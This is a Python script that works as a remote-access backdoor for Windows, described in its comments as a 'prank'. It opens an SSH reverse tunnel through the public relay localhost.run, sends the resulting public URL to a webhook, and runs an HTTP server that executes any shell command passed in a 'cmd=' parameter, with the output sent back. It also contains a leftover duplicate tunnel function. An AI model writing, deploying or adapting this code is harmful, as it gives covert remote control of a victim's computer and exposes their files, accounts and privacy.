import subprocess, time, os, json, urllib.request, urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

def start_tunnel():
    while True:
        # This starts the SSH tunnel in the background
        # It uses 'shell=True' so it doesn't pop a window
        subprocess.run('ssh -R 80:localhost:5000 nyan@localhost.run', shell=True)
        time.sleep(5) # Wait 5 seconds before restarting if it crashes

# This starts the tunnel function on a separate thread so your 
# main prank code can keep running at the same time
threading.Thread(target=start_tunnel, daemon=True).start()

# --- CONFIG ---

#replcace with your own config
TOKEN = ""
PORT = 8888 #Dont change this!
WEBHOOK_URL = ""
LOG_PATH = os.path.join(os.environ["LOCALAPPDATA"], "bridge_log.txt")
# --------------

class BridgeHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Flexible check for token and command
        if TOKEN in self.path and "cmd=" in self.path:
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            try:
                # Manual extraction to prevent library errors
                raw_cmd = self.path.split("cmd=")[1].split("&")[0]
                cmd = urllib.parse.unquote(raw_cmd)
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                self.wfile.write(output if output else b"Success (No Output)")
            except Exception as e:
                self.wfile.write(f"Error: {str(e)}".encode())
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bridge Active")

    def log_message(self, format, *args): return

def start_tunnel():
    # Force fresh log and start SSH
    if os.path.exists(LOG_PATH):
        try: os.remove(LOG_PATH)
        except: pass
    return subprocess.Popen(f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=15 -R 80:127.0.0.1:{PORT} nokey@localhost.run", 
                            shell=True, stdout=open(LOG_PATH, "w", buffering=1), stderr=subprocess.STDOUT)

if __name__ == "__main__":
    while True: # Network Wait
        try:
            urllib.request.urlopen('https://www.google.com', timeout=5)
            break
        except: time.sleep(5)

    tunnel_proc = start_tunnel()
    time.sleep(12) # Let SSH generate the link

    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            log = f.read()
            if ".lhr.life" in log:
                url = [p for p in log.split() if ".lhr.life" in p][0]
                try:
                    payload = {"content": f"🚀 **Bridge Online!**\n🔗 {url}"}
                    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                    req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(payload).encode(), headers=headers)
                    urllib.request.urlopen(req)
                except: pass

    server = HTTPServer(('0.0.0.0', PORT), BridgeHandler)
    server.serve_forever()
